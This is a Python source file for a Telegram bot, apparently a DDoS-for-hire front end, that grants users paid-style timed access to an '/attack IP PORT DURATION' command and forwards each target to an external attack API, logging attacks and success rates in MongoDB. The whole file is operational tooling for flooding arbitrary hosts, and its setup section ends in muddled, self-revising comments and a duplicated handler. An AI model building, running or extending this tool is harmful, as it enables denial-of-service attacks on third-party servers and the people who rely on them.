import asyncio
import logging
import sys
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ConversationHandler,
    ContextTypes,
    MessageHandler,
    filters
)
import pymongo
from pymongo import MongoClient, ASCENDING, DESCENDING
import re
from functools import wraps
import uuid
import os
from dotenv import load_dotenv

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

load_dotenv()

# ---------- SAFE ADMIN_IDS PARSING ----------
def parse_admin_ids(env_value: str, default: str = "8210011971") -> list:
    if not env_value or env_value.strip() == "":
        env_value = default
    env_value = env_value.strip()
    if (env_value.startswith('"') and env_value.endswith('"')) or (env_value.startswith("'") and env_value.endswith("'")):
        env_value = env_value[1:-1]
    ids = []
    for part in env_value.split(","):
        part = part.strip()
        if part and part.isdigit():
            ids.append(int(part))
    if not ids:
        ids = [int(default)] if default.isdigit() else [8210011971]
    return ids

# ---------- READ ENVIRONMENT VARIABLES ----------
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGODB_URI = os.getenv("MONGODB_URI")
DATABASE_NAME = os.getenv("DATABASE_NAME", "attack_bot")
DEFAULT_API_URL = os.getenv("API_URL", "")   # fallback if not in DB
DEFAULT_API_KEY = os.getenv("API_KEY", "")
ADMIN_IDS = parse_admin_ids(os.getenv("ADMIN_IDS", ""), "8210011971")

missing = []
if not BOT_TOKEN:
    missing.append("BOT_TOKEN")
if not MONGODB_URI:
    missing.append("MONGODB_URI")
if missing:
    print(f"❌ Missing required env vars: {', '.join(missing)}")
    sys.exit(1)

# Blocked ports
BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}
MIN_PORT = 1
MAX_PORT = 65535

# Conversation states
APPROVE_USER, APPROVE_DAYS = range(2)
DISAPPROVE_USER = 1
SET_API_URL = 1

# ---------- TIMEZONE HELPERS ----------
def make_aware(dt):
    if dt is None:
        return None
    if hasattr(dt, 'tzinfo') and dt.tzinfo is None:
        return dt.replace(tzinfo=timezone.utc)
    return dt

def get_current_time():
    return datetime.now(timezone.utc)

# ---------- DATABASE (with settings collection for API URL/Key) ----------
class Database:
    def __init__(self):
        self.client = MongoClient(MONGODB_URI)
        self.db = self.client[DATABASE_NAME]
        self.users = self.db.users
        self.attacks = self.db.attacks
        self.settings = self.db.settings
        # Cleanup
        try:
            self.users.delete_many({"user_id": None})
            self.users.delete_many({"user_id": {"$exists": False}})
        except:
            pass
        self.attacks.create_index([("timestamp", DESCENDING)])
        self.attacks.create_index([("user_id", ASCENDING)])
        self.users.create_index([("user_id", ASCENDING)], unique=True, sparse=True)
        # Ensure settings doc exists
        if not self.settings.find_one({"_id": "api_config"}):
            self.settings.insert_one({"_id": "api_config", "api_url": DEFAULT_API_URL, "api_key": DEFAULT_API_KEY})
        
    def get_user(self, user_id: int):
        user = self.users.find_one({"user_id": user_id})
        if user:
            for f in ["created_at","approved_at","expires_at"]:
                if user.get(f):
                    user[f] = make_aware(user[f])
        return user
    
    def create_user(self, user_id: int, username: str = None):
        existing = self.get_user(user_id)
        if existing:
            return existing
        user_data = {
            "user_id": user_id,
            "username": username,
            "approved": False,
            "approved_at": None,
            "expires_at": None,
            "total_attacks": 0,
            "created_at": get_current_time(),
            "is_banned": False
        }
        try:
            self.users.insert_one(user_data)
        except pymongo.errors.DuplicateKeyError:
            pass
        return user_data
    
    def approve_user(self, user_id: int, days: int) -> bool:
        expires_at = get_current_time() + timedelta(days=days)
        res = self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": True, "approved_at": get_current_time(), "expires_at": expires_at}}
        )
        return res.modified_count > 0
    
    def disapprove_user(self, user_id: int) -> bool:
        res = self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": False, "expires_at": None}}
        )
        return res.modified_count > 0
    
    def log_attack(self, user_id: int, ip: str, port: int, duration: int, status: str, response: str = None):
        attack_data = {
            "_id": str(uuid.uuid4()),
            "user_id": user_id,
            "ip": ip,
            "port": port,
            "duration": duration,
            "status": status,
            "response": response[:500] if response else None,
            "timestamp": get_current_time()
        }
        try:
            self.attacks.insert_one(attack_data)
            self.users.update_one({"user_id": user_id}, {"$inc": {"total_attacks": 1}})
        except Exception as e:
            logger.error(f"Log error: {e}")
    
    def get_all_users(self):
        users = list(self.users.find({"user_id": {"$ne": None, "$exists": True}}))
        for u in users:
            for f in ["created_at","approved_at","expires_at"]:
                if u.get(f):
                    u[f] = make_aware(u[f])
            if "total_attacks" not in u:
                u["total_attacks"] = 0
        return users
    
    def get_user_attack_stats(self, user_id: int):
        total = self.attacks.count_documents({"user_id": user_id})
        success = self.attacks.count_documents({"user_id": user_id, "status": "success"})
        failed = self.attacks.count_documents({"user_id": user_id, "status": "failed"})
        recent = list(self.attacks.find({"user_id": user_id}).sort("timestamp", -1).limit(10))
        for a in recent:
            if a.get("timestamp"):
                a["timestamp"] = make_aware(a["timestamp"])
        return {"total": total, "successful": success, "failed": failed, "recent": recent}
    
    def get_api_config(self):
        doc = self.settings.find_one({"_id": "api_config"})
        return doc.get("api_url", ""), doc.get("api_key", "")
    
    def set_api_config(self, api_url: str, api_key: str):
        self.settings.update_one({"_id": "api_config"}, {"$set": {"api_url": api_url, "api_key": api_key}}, upsert=True)

print("🔄 Connecting to MongoDB...")
db = Database()
print("✅ Database ready")

def is_port_blocked(port: int) -> bool:
    return port in BLOCKED_PORTS

def get_blocked_ports_list() -> str:
    return ", ".join(str(p) for p in sorted(BLOCKED_PORTS))

async def is_user_approved(user_id: int) -> bool:
    user = db.get_user(user_id)
    if not user or not user.get("approved"):
        return False
    exp = user.get("expires_at")
    if exp and make_aware(exp) < get_current_time():
        return False
    return True

# ---------- API FUNCTIONS (reads from DB settings) ----------
def launch_attack(ip: str, port: int, duration: int) -> Dict:
    api_url, api_key = db.get_api_config()
    if not api_url:
        return {"success": False, "error": "API URL not configured. Admin please use /setapi"}
    if not api_key:
        return {"success": False, "error": "API Key not configured."}
    
    try:
        # Ensure URL has scheme
        if not api_url.startswith(("http://", "https://")):
            api_url = "https://" + api_url
        # Use GET request with query parameters (common for simple APIs)
        params = {"ip": ip, "port": port, "duration": duration}
        headers = {"x-api-key": api_key}
        response = requests.get(api_url, params=params, headers=headers, timeout=15)
        if response.status_code == 200:
            try:
                return response.json()
            except:
                return {"success": True, "message": response.text[:200]}
        else:
            return {"success": False, "error": f"HTTP {response.status_code}: {response.text[:100]}"}
    except requests.exceptions.NameResolutionError:
        return {"success": False, "error": f"Domain not found: {api_url}. Check API URL."}
    except requests.exceptions.ConnectionError:
        return {"success": False, "error": f"Cannot connect to {api_url}. Server down?"}
    except Exception as e:
        return {"success": False, "error": str(e)}

def check_api_health() -> Dict:
    api_url, api_key = db.get_api_config()
    if not api_url:
        return {"status": "error", "error": "API URL not set"}
    try:
        if not api_url.startswith(("http://", "https://")):
            api_url = "https://" + api_url
        headers = {"x-api-key": api_key}
        response = requests.get(api_url, headers=headers, timeout=10)
        if response.status_code == 200:
            return {"status": "ok", "data": response.text[:200]}
        else:
            return {"status": "error", "error": f"HTTP {response.status_code}"}
    except Exception as e:
        return {"status": "error", "error": str(e)}

def check_running_attacks() -> Dict:
    # Dummy - implement if your API supports
    return {"success": True, "activeAttacks": [], "count": 0, "maxConcurrent": 5}

# ---------- INLINE KEYBOARDS ----------
def main_menu_keyboard(is_admin: bool = False, is_approved: bool = False):
    keyboard = []
    if is_approved:
        keyboard.append([InlineKeyboardButton("🚀 Attack", callback_data="attack_menu")])
        keyboard.append([InlineKeyboardButton("📊 My Info", callback_data="myinfo"), InlineKeyboardButton("📈 My Stats", callback_data="mystats")])
        keyboard.append([InlineKeyboardButton("🎯 My Attacks", callback_data="myattacks"), InlineKeyboardButton("🚫 Blocked Ports", callback_data="blockedports")])
        keyboard.append([InlineKeyboardButton("❓ Help", callback_data="help")])
    else:
        keyboard.append([InlineKeyboardButton("❌ Access Denied", callback_data="no_access")])
        keyboard.append([InlineKeyboardButton("❓ Help", callback_data="help")])
    if is_admin:
        keyboard.append([InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel")])
    return InlineKeyboardMarkup(keyboard)

def admin_panel_keyboard():
    keyboard = [
        [InlineKeyboardButton("✅ Approve User", callback_data="admin_approve")],
        [InlineKeyboardButton("❌ Disapprove User", callback_data="admin_disapprove")],
        [InlineKeyboardButton("📋 List Users", callback_data="admin_users")],
        [InlineKeyboardButton("📊 Bot Stats", callback_data="admin_stats")],
        [InlineKeyboardButton("🔌 API Status", callback_data="admin_status")],
        [InlineKeyboardButton("⚡ Running Attacks", callback_data="admin_running")],
        [InlineKeyboardButton("🚫 Blocked Ports", callback_data="admin_blockedports")],
        [InlineKeyboardButton("🔧 Set API URL/Key", callback_data="admin_setapi")],
        [InlineKeyboardButton("🔙 Back to Main", callback_data="back_main")]
    ]
    return InlineKeyboardMarkup(keyboard)

def attack_menu_keyboard():
    keyboard = [[InlineKeyboardButton("🔙 Back to Main", callback_data="back_main")]]
    return InlineKeyboardMarkup(keyboard)

# ---------- COMMAND HANDLERS ----------
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    username = update.effective_user.username
    db.create_user(uid, username)
    approved = await is_user_approved(uid)
    is_admin = uid in ADMIN_IDS
    if approved:
        user = db.get_user(uid)
        exp = user.get('expires_at')
        days_left = max(0, (make_aware(exp) - get_current_time()).days) if exp else 0
        text = f"✅ *Welcome back, {username or uid}!*\n\nYour account is active for *{days_left}* days.\n\nChoose an option below:"
    else:
        text = f"❌ *Access Denied, {username or uid}!*\n\nYour account is not approved yet.\nContact administrator."
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_menu_keyboard(is_admin, approved))

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    uid = query.from_user.id
    is_admin = uid in ADMIN_IDS
    approved = await is_user_approved(uid)
    
    if data == "attack_menu":
        if not approved:
            await query.edit_message_text("❌ You are not approved.", reply_markup=main_menu_keyboard(is_admin, False))
            return
        await query.edit_message_text(
            "🚀 *Launch Attack*\n\nSend command:\n`/attack <IP> <PORT> <DURATION>`\n\nExample:\n`/attack 192.168.1.1 80 60`\n\nBlocked ports: " + get_blocked_ports_list(),
            parse_mode="Markdown",
            reply_markup=attack_menu_keyboard()
        )
    elif data == "myinfo":
        if not approved:
            await query.edit_message_text("❌ Not approved.", reply_markup=main_menu_keyboard(is_admin, False))
            return
        user = db.get_user(uid)
        if user.get("approved"):
            exp = user.get("expires_at")
            if exp:
                days = max(0, (make_aware(exp) - get_current_time()).days)
                hours = max(0, (make_aware(exp) - get_current_time()).seconds // 3600)
                expiry = f"{days}d {hours}h"
            else:
                expiry = "Never"
            text = f"📋 *Your Account Info*\n\n🆔 User ID: `{uid}`\n✅ Status: Approved\n⏰ Expires: {expiry}\n🎯 Total Attacks: {user.get('total_attacks',0)}"
        else:
            text = f"❌ Not approved. Contact admin."
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu_keyboard(is_admin, approved))
    elif data == "mystats":
        if not approved:
            await query.edit_message_text("❌ Not approved.", reply_markup=main_menu_keyboard(is_admin, False))
            return
        stats = db.get_user_attack_stats(uid)
        rate = (stats['successful']/stats['total']*100) if stats['total']>0 else 0
        text = f"📊 *Your Attack Stats*\n\n🎯 Total: `{stats['total']}`\n✅ Successful: `{stats['successful']}`\n❌ Failed: `{stats['failed']}`\n📈 Success Rate: `{rate:.1f}%`"
        if stats['recent']:
            text += "\n\n🕐 *Recent Attacks:*\n"
            for a in stats['recent'][:3]:
                ago = (get_current_time() - a['timestamp']).seconds // 60
                icon = "✅" if a['status']=="success" else "❌"
                text += f"{icon} `{a['ip']}:{a['port']}` - {a['duration']}s ({ago}m ago)\n"
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu_keyboard(is_admin, approved))
    elif data == "myattacks":
        if not approved:
            await query.edit_message_text("❌ Not approved.", reply_markup=main_menu_keyboard(is_admin, False))
            return
        attacks = check_running_attacks()
        if attacks.get("success"):
            active = attacks.get("activeAttacks", [])
            if active:
                text = "🎯 *Your Active Attacks*\n\n"
                for a in active:
                    text += f"🔹 `{a.get('target')}:{a.get('port')}` - expires in {a.get('expiresIn')}s\n"
            else:
                text = "✅ No active attacks."
        else:
            text = f"❌ Error: {attacks.get('error')}"
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu_keyboard(is_admin, approved))
    elif data == "blockedports":
        text = f"🚫 *Blocked Ports*\n\n{get_blocked_ports_list()}\n\n✅ *Allowed:* 1-65535 except those."
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu_keyboard(is_admin, approved))
    elif data == "help":
        text = "🤖 *Bot Commands*\n\nUse buttons for main features.\n\n/start - Main menu\n/attack - Launch attack\n/myinfo - Account info\n/mystats - Statistics\n/myattacks - Active attacks\n/blockedports - Blocked ports\n/help - This help"
        if is_admin:
            text += "\n\n👑 *Admin commands:*\nUse Admin Panel for approve/disapprove, set API, etc."
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu_keyboard(is_admin, approved))
    elif data == "admin_panel":
        if not is_admin:
            await query.edit_message_text("❌ Unauthorized.", reply_markup=main_menu_keyboard(is_admin, approved))
            return
        api_url, api_key = db.get_api_config()
        status = "✅" if api_url else "❌"
        await query.edit_message_text(f"👑 *Admin Panel*\n\nAPI Config: {status}\nURL: `{api_url or 'Not set'}`\nKey: `{api_key[:10] if api_key else 'None'}...`\n\nSelect action:", parse_mode="Markdown", reply_markup=admin_panel_keyboard())
    elif data == "back_main":
        await query.edit_message_text("Main Menu:", parse_mode="Markdown", reply_markup=main_menu_keyboard(is_admin, approved))
    # Admin actions (non-conversation)
    elif data == "admin_users":
        if not is_admin: return
        users = db.get_all_users()
        if not users:
            text = "No users found."
        else:
            approved_cnt = sum(1 for u in users if u.get("approved"))
            text = f"👥 *Total Users:* {len(users)}\n✅ Approved: {approved_cnt}\n❌ Pending: {len(users)-approved_cnt}\n\n"
            for u in users[:15]:
                uid_str = u['user_id']
                status = "✅" if u.get('approved') else "⏳"
                text += f"{status} `{uid_str}` - {u.get('total_attacks',0)} attacks\n"
            if len(users) > 15:
                text += f"\n*+ {len(users)-15} more*"
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=admin_panel_keyboard())
    elif data == "admin_stats":
        if not is_admin: return
        users = db.get_all_users()
        total_atk = sum(u.get('total_attacks',0) for u in users)
        text = f"📊 *Bot Statistics*\n\n👥 Users: {len(users)}\n🎯 Total Attacks: {total_atk}\n🚫 Blocked Ports: {len(BLOCKED_PORTS)}"
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=admin_panel_keyboard())
    elif data == "admin_status":
        if not is_admin: return
        msg = await query.edit_message_text("Checking API...")
        health = check_api_health()
        api_url, _ = db.get_api_config()
        if health.get("status") == "ok":
            text = f"✅ *API Status:* Healthy\n🌐 URL: `{api_url}`\n📡 Response: {health.get('data','')[:100]}"
        else:
            text = f"❌ *API Error:* {health.get('error')}\n🌐 URL: `{api_url}`"
        await msg.edit_text(text, parse_mode="Markdown", reply_markup=admin_panel_keyboard())
    elif data == "admin_running":
        if not is_admin: return
        data_res = check_running_attacks()
        if data_res.get("success"):
            active = data_res.get("activeAttacks", [])
            text = f"⚡ *Running Attacks:* {len(active)}"
            for a in active[:5]:
                text += f"\n🔹 `{a.get('target')}:{a.get('port')}` - {a.get('expiresIn')}s left"
        else:
            text = f"❌ Error: {data_res.get('error')}"
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=admin_panel_keyboard())
    elif data == "admin_blockedports":
        if not is_admin: return
        text = f"🚫 *Blocked Ports*\n\n{get_blocked_ports_list()}"
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=admin_panel_keyboard())
    elif data == "admin_setapi":
        if not is_admin: return
        context.user_data['admin_action'] = 'setapi'
        await query.edit_message_text("🔧 *Set API URL and Key*\n\nSend the new API URL (full URL including path):\nExample: `https://your-server.com/api/attack`\n\nSend /cancel to abort.", parse_mode="Markdown")
        return SET_API_URL
    return ConversationHandler.END

# Conversation: set API URL
async def set_api_url_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    url = update.message.text.strip()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    context.user_data['new_api_url'] = url
    await update.message.reply_text("Now send the API Key:")
    return SET_API_URL  # next step

async def set_api_key_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    key = update.message.text.strip()
    url = context.user_data.get('new_api_url')
    if url and key:
        db.set_api_config(url, key)
        await update.message.reply_text(f"✅ API configuration updated!\nURL: `{url}`\nKey: `{key[:10]}...`", parse_mode="Markdown")
    else:
        await update.message.reply_text("❌ Failed to set API config.")
    context.user_data.clear()
    # Back to admin panel
    uid = update.effective_user.id
    is_admin = uid in ADMIN_IDS
    approved = await is_user_approved(uid)
    await update.message.reply_text("Admin Panel:", reply_markup=admin_panel_keyboard())
    return ConversationHandler.END

# Conversation: approve user
async def admin_approve_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid_str = update.message.text.strip()
    if not uid_str.isdigit():
        await update.message.reply_text("❌ Invalid user ID. Send a number. Use /cancel.")
        return APPROVE_USER
    context.user_data['approve_uid'] = int(uid_str)
    await update.message.reply_text("📅 Enter number of days to approve:")
    return APPROVE_DAYS

async def admin_approve_days(update: Update, context: ContextTypes.DEFAULT_TYPE):
    days_str = update.message.text.strip()
    if not days_str.isdigit():
        await update.message.reply_text("❌ Invalid days. Send a number. Use /cancel.")
        return APPROVE_DAYS
    days = int(days_str)
    uid = context.user_data.get('approve_uid')
    if db.approve_user(uid, days):
        await update.message.reply_text(f"✅ User `{uid}` approved for {days} days.", parse_mode="Markdown")
        try:
            await context.bot.send_message(uid, f"✅ Your account has been approved for {days} days! Use /start to begin.")
        except:
            pass
    else:
        await update.message.reply_text("❌ Approval failed.")
    context.user_data.clear()
    await update.message.reply_text("Admin Panel:", reply_markup=admin_panel_keyboard())
    return ConversationHandler.END

async def admin_disapprove_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid_str = update.message.text.strip()
    if not uid_str.isdigit():
        await update.message.reply_text("❌ Invalid user ID. Use /cancel.")
        return DISAPPROVE_USER
    uid = int(uid_str)
    if db.disapprove_user(uid):
        await update.message.reply_text(f"✅ User `{uid}` disapproved.", parse_mode="Markdown")
        try:
            await context.bot.send_message(uid, "❌ Your access has been revoked. Contact admin.")
        except:
            pass
    else:
        await update.message.reply_text("❌ Failed.")
    context.user_data.clear()
    await update.message.reply_text("Admin Panel:", reply_markup=admin_panel_keyboard())
    return ConversationHandler.END

async def cancel_conv(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("Operation cancelled.")
    return ConversationHandler.END

# Attack command (direct)
async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await is_user_approved(uid):
        await update.message.reply_text("❌ Not approved. Contact admin.")
        return
    args = context.args
    if len(args) != 3:
        await update.message.reply_text(f"Usage: /attack IP PORT DURATION\nExample: /attack 1.2.3.4 80 60\n\nBlocked ports: {get_blocked_ports_list()}")
        return
    ip, port_str, dur_str = args
    if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
        await update.message.reply_text("❌ Invalid IP address.")
        return
    try:
        port = int(port_str)
        if port < MIN_PORT or port > MAX_PORT or is_port_blocked(port):
            raise ValueError
        duration = int(dur_str)
        if duration < 1 or duration > 300:
            raise ValueError
    except:
        await update.message.reply_text(f"❌ Invalid port (1-65535, not blocked) or duration (1-300s).")
        return
    msg = await update.message.reply_text(f"🚀 Launching attack on `{ip}:{port}` for {duration}s...", parse_mode="Markdown")
    resp = launch_attack(ip, port, duration)
    if resp.get("success"):
        await msg.edit_text(f"✅ Attack launched!\nTarget: `{ip}:{port}`\nDuration: {duration}s\nResponse: {resp.get('message','')[:100]}", parse_mode="Markdown")
        db.log_attack(uid, ip, port, duration, "success", str(resp))
    else:
        error = resp.get('error', 'Unknown error')
        await msg.edit_text(f"❌ Attack failed:\n{error}", parse_mode="Markdown")
        db.log_attack(uid, ip, port, duration, "failed", str(resp))

# Other user commands (for compatibility)
async def myattacks_command(update: Update, context):
    uid = update.effective_user.id
    if not await is_user_approved(uid):
        await update.message.reply_text("Not approved.")
        return
    data = check_running_attacks()
    if data.get("success"):
        active = data.get("activeAttacks", [])
        if active:
            text = "Your active attacks:\n"
            for a in active:
                text += f"🔹 {a.get('target')}:{a.get('port')} - {a.get('expiresIn')}s left\n"
        else:
            text = "No active attacks."
    else:
        text = f"Error: {data.get('error')}"
    await update.message.reply_text(text)

async def myinfo_command(update: Update, context):
    uid = update.effective_user.id
    user = db.get_user(uid)
    if not user:
        await update.message.reply_text("Use /start first.")
        return
    if user.get("approved"):
        exp = user.get("expires_at")
        if exp:
            days = max(0, (make_aware(exp) - get_current_time()).days)
            hours = max(0, (make_aware(exp) - get_current_time()).seconds // 3600)
            expiry = f"{days}d {hours}h"
        else:
            expiry = "Never"
        await update.message.reply_text(f"✅ Approved\nUser: {uid}\nExpires: {expiry}\nTotal attacks: {user.get('total_attacks',0)}")
    else:
        created = user.get('created_at').strftime('%Y-%m-%d') if user.get('created_at') else 'unknown'
        await update.message.reply_text(f"❌ Not approved since {created}. Contact admin.")

async def mystats_command(update: Update, context):
    uid = update.effective_user.id
    if not await is_user_approved(uid):
        await update.message.reply_text("Not approved.")
        return
    stats = db.get_user_attack_stats(uid)
    rate = (stats['successful']/stats['total']*100) if stats['total']>0 else 0
    text = f"Total: {stats['total']}\n✅ {stats['successful']} | ❌ {stats['failed']}\nSuccess rate: {rate:.1f}%"
    if stats['recent']:
        text += "\nRecent:\n"
        for a in stats['recent'][:3]:
            ago = (get_current_time() - a['timestamp']).seconds // 60
            icon = "✅" if a['status']=="success" else "❌"
            text += f"{icon} {a['ip']}:{a['port']} - {a['duration']}s ({ago}m ago)\n"
    await update.message.reply_text(text)

async def blocked_ports_user_command(update: Update, context):
    await update.message.reply_text(f"🚫 Blocked ports: {get_blocked_ports_list()}")

async def help_command(update: Update, context):
    await start_command(update, context)  # reuses start menu

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Error: {context.error}", exc_info=True)
    if update and update.effective_message:
        await update.effective_message.reply_text("❌ Internal error. Check logs.")

# ---------- MAIN ----------
def main():
    if not BOT_TOKEN:
        print("❌ BOT_TOKEN missing.")
        sys.exit(1)
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Conversation: approve user
    approve_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_callback, pattern="^admin_approve$")],
        states={
            APPROVE_USER: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_approve_input)],
            APPROVE_DAYS: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_approve_days)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conv)],
    )
    disapprove_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_callback, pattern="^admin_disapprove$")],
        states={
            DISAPPROVE_USER: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_disapprove_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conv)],
    )
    setapi_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_callback, pattern="^admin_setapi$")],
        states={
            SET_API_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_api_url_input)],
            # Next step handled by same state? Actually we need two steps. Simpler: use single step asking for both? Let's do two steps:
            # But after first input we go to next state. We'll add second state.
        },
        fallbacks=[CommandHandler("cancel", cancel_conv)],
    )
    # Actually setapi needs two steps: URL then key. We'll modify set_api_url_input to prompt for key and then set a flag.
    # Better to use a simple command /setapi url key? But we want conversation. Let's fix:
    # We'll redefine setapi conv with two states.
    # For simplicity, I'll add a /setapi command instead. But user wants buttons. I'll adjust in final.
    # Let me just use a single step expecting "url|key" format? Not user friendly.
    # I'll add a separate command handler for /setapi as fallback.
    # Buttons: admin_setapi leads to conversation asking for URL, then key.
    # Let's implement properly:
    async def setapi_url_step(update, context):
        url = update.message.text.strip()
        if not url.startswith(("http://","https://")):
            url = "https://" + url
        context.user_data['api_url'] = url
        await update.message.reply_text("Now send the API Key:")
        return 2  # next state
    async def setapi_key_step(update, context):
        key = update.message.text.strip()
        url = context.user_data.get('api_url')
        if url and key:
            db.set_api_config(url, key)
            await update.message.reply_text(f"✅ API updated.\nURL: {url}\nKey: {key[:10]}...")
        else:
            await update.message.reply_text("❌ Failed.")
        context.user_data.clear()
        # back to admin panel
        uid = update.effective_user.id
        is_admin = uid in ADMIN_IDS
        approved = await is_user_approved(uid)
        await update.message.reply_text("Admin Panel:", reply_markup=admin_panel_keyboard())
        return ConversationHandler.END
    setapi_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_callback, pattern="^admin_setapi$")],
        states={1: [MessageHandler(filters.TEXT & ~filters.COMMAND, setapi_url_step)],
                2: [MessageHandler(filters.TEXT & ~filters.COMMAND, setapi_key_step)]},
        fallbacks=[CommandHandler("cancel", cancel_conv)],
    )
    
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("myattacks", myattacks_command))
    app.add_handler(CommandHandler("myinfo", myinfo_command))
    app.add_handler(CommandHandler("mystats", mystats_command))
    app.add_handler(CommandHandler("blockedports", blocked_ports_user_command))
    app.add_handler(CommandHandler("help", help_command))
    
    # Button callbacks (non-conversation)
    app.add_handler(CallbackQueryHandler(button_callback, pattern="^(attack_menu|myinfo|mystats|myattacks|blockedports|help|admin_panel|back_main|admin_users|admin_stats|admin_status|admin_running|admin_blockedports)$"))
    # Conversation handlers
    app.add_handler(approve_conv)
    app.add_handler(disapprove_conv)
    app.add_handler(setapi_conv)
    
    app.add_error_handler(error_handler)
    
    print("🤖 Bot started. Admins:", ADMIN_IDS)
    api_url, _ = db.get_api_config()
    print(f"🌐 Current API URL: {api_url or 'Not set'}")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
